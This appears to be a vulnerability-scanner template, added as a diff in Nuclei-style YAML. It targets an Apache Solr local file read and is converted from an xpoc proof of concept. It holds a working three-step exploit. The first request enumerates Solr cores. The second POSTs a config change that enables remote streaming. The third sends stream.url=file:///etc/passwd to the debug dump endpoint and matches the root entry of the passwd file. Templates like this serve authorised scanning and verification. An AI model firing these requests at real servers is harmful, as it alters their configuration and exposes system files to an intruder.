@@ -1,0 +1,53 @@
+id: yaml-poc-apache-solr-readfile-CT-158741
+info:
+  name: Yaml Poc Apache Solr Readfile Ct 158741
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-apache-solr-readfile-CT-158741'
+  tags: apache,lfi
+  reference: []
+http:
+- method: GET
+  path:
+  - /solr/admin/cores?wt=json
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - responseHeader
+- method: POST
+  path:
+  - /solr/{{core}}/config
+  body: "{\n  \"set-property\":{\n    \"requestDispatcher.requestParsers.enableRemoteStreaming\"\
+    :true\n  }\n}"
+  headers:
+    Content-Type: application/json
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - This response format is experimental
+- method: POST
+  path:
+  - /solr/{{core}}/debug/dump?param=ContentStreams
+  body: stream.url=file:///etc/passwd
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - 'root:[x*]:0:0:'
